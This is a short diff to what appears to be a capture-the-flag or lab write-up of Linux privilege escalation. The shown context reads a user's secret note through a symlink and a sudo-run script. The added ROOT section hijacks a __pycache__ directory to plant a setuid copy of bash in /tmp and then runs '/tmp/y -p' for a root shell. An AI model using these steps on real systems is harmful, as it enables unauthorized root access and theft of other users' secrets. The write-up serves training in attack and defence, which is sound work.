@@ -11,3 +11,12 @@ USER:
     ln -s /home/james/secret-note.txt x
     sudo -u james /home/james/totalwc.sh
     Get password, change user using su
+ROOT:
+    We can rename __pycache__ and add our own one
+    cp /bin/bash /tmp/x
+    Replace the cat /proc/cpuinfo with the following
+        cp /tmp/x /tmp/y
+        chmod +s /tmp/y
+    Then after getting root to run those commands, we can do
+    /tmp/y -p
+    To get a shell with euid root
